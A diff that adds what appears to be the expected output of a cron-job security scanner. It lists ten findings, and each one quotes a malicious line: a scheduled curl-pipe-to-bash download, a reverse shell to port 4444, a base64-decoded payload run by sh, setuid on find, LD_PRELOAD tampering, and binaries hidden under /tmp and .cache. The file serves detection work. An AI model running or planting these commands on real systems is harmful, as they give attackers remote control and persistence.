@@ -1,0 +1,31 @@
+10 findings
+CRITICAL CR002 etc/cron.d/sys-update:2
+         downloads and executes remote code on a schedule
+         curl -s http://203.0.113.50/u.sh | bash
+CRITICAL CR001 etc/cron.d/sys-update:4
+         reverse shell pattern
+         bash -i >& /dev/tcp/203.0.113.50/4444 0>&1
+CRITICAL CR003 var/spool/deploy:3
+         decodes a hidden payload and runs it
+         echo cGF5bG9hZA== | base64 -d | sh
+HIGH     CR004 etc/cron.d/sys-update:3
+         runs something from a world-writable directory
+         /tmp/.X11-unix/helper >/dev/null 2>&1
+HIGH     CR009 etc/cron.d/sys-update:5
+         root job that opens permissions or sets setuid
+         chmod u+s /usr/bin/find
+HIGH     CR006 var/spool/deploy:4
+         @reboot job that uses network tools: classic persistence
+         nohup python -c "import socket" &
+HIGH     CR007 var/spool/deploy:6
+         rootkit-style tampering (LD_PRELOAD or immutable flags)
+         LD_PRELOAD=/lib/x.so /usr/bin/php /srv/app/cron.php
+MEDIUM   CR008 etc/cron.d/sys-update:2
+         runs every minute from an unusual location
+         curl -s http://203.0.113.50/u.sh | bash
+MEDIUM   CR005 etc/cron.d/sys-update:3
+         runs from a hidden path
+         /tmp/.X11-unix/helper >/dev/null 2>&1
+MEDIUM   CR005 var/spool/deploy:5
+         runs from a hidden path
+         /home/deploy/.cache/.agent --sync
